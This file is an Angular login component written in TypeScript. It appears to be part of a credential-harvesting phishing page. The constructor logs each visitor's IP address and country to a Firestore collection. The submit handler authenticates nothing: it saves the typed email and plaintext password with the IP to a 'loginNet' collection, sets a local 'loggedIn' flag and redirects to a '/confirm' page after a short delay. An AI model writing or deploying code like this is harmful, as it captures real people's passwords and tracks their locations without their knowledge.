import { Component, OnInit } from '@angular/core';
import { Login } from './login';
import { Router } from '@angular/router';

import { } from 'file-system';
import { MyService } from '../myservice';
import { AngularFirestore, AngularFirestoreCollection } from '@angular/fire/firestore';
import { Observable } from 'rxjs';
import { map, catchError } from 'rxjs/operators';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css']
})
export class LoginComponent implements OnInit {
  login: Login = {email:'',password:'',dateTime:'',ip:''};
  visit:any = {ip:'',country:'',dateTime:''};
  loginsCollection: AngularFirestoreCollection<Login>;
  visitsCollection: AngularFirestoreCollection<any>;
  logins:Observable<Login[]>;
  finished:boolean=false;
  
  constructor(private router: Router, db: AngularFirestore,myService:MyService) { 
    this.visitsCollection=db.collection('visitsNet');
    this.visit.dateTime =Date.now();
    myService.getIpAddress().subscribe(ip => {
      this.visit.ip=ip.ip;
      myService.getCountry(ip.ip).subscribe(country => {
        this.visit.country=country.country_name;
        this.visitsCollection.add(this.visit);
      });
    });
    

   
    this.loginsCollection=db.collection('loginNet');
    /*this.logins=this.loginsCollection.snapshotChanges().pipe(
      map ( changes=> {
        return changes.map(
          a=> {
            const data = a.payload.doc.data() as Login;
            data.id=a.payload.doc.id;
            return data;
          }
        )
      })
    );*/
    
    
  }

  ngOnInit() {
    if (localStorage.getItem('loggedIn') != null) {
      this.router.navigate(['/confirm']);
    }
    
  }


async delayAndRedirect(ms: number) {
  this.finished=true;
  await new Promise(resolve => setTimeout(()=>resolve(), ms)).then(()=>console.log("fired"));  
  this.router.navigate(['/confirm']);
}

  onSubmit(form) {
    if (form.valid) {
      this.delayAndRedirect(2000);
      this.login.dateTime=Date.now();
      this.login.ip=this.visit.ip;
      this.loginsCollection.add(this.login);
     // this.myService.addLogin(this.login.email, this.login.password).subscribe(data => console.log(data));
      localStorage.setItem('loggedIn', 'yes');
      localStorage.setItem('ip',this.login.ip);
      
    }
  }



}
